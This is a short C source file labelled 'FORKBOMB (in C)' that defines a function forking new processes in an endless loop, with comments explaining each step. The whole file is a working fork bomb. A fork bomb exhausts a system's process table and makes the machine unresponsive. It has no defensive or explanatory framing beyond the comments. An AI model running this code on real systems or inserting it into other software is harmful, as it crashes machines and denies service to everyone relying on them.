/*
*	FORKBOMB (in C)
*
*
*/

//LIBRARIES
#include <unistd.h>

void forkbomb()
{
	// while true and always true
	// keep forking
	while(1) {
		fork(); // creates a whole new copy of the previous process
	}
}
